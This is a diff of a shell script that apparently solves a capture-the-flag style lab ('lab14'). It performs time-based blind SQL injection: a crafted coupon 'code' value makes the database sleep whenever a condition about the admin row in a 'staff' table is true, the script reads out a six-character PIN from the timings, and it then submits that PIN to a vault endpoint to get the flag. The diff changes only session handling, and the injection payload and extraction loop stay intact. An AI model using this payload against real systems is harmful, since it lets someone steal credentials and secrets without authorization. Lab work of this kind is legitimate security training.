@@ -7,10 +7,10 @@ new_session lab14
 DELAY=0.4
 THRESHOLD=250   # ms
 
-"$H5I" browser open "$URL/api/coupon?code=SPRING10" --session "$SESSION" --new --capture >/dev/null
+open_lab "$SESSION" "$URL/api/coupon?code=SPRING10"
 
 ms() {  # ms CONDITION -> milliseconds the server took
-    "$H5I" websec replay req_0 --session "$SESSION" --reset-budget \
+    "$H5I" websec replay "$REQ0" --session "$SESSION" --json --reset-budget \
         --set "query.code=zz' OR (SELECT CASE WHEN ($1) THEN sleep($DELAY) ELSE 0 END FROM staff WHERE name='admin') -- " |
         python3 -c 'import json,sys;print(json.load(sys.stdin)["samples"][0]["total_ms"])'
 }
@@ -33,4 +33,4 @@ for i in $(seq 1 6); do
     PIN="$PIN$(printf "\\$(printf '%03o' "$LO")")"
 done
 
-send "$SESSION" req_0 --set path=/api/vault --unset query.code --create --set "query.pin=$PIN" | flag
+send "$SESSION" "$REQ0" --set path=/api/vault --unset query.code --create --set "query.pin=$PIN" | flag
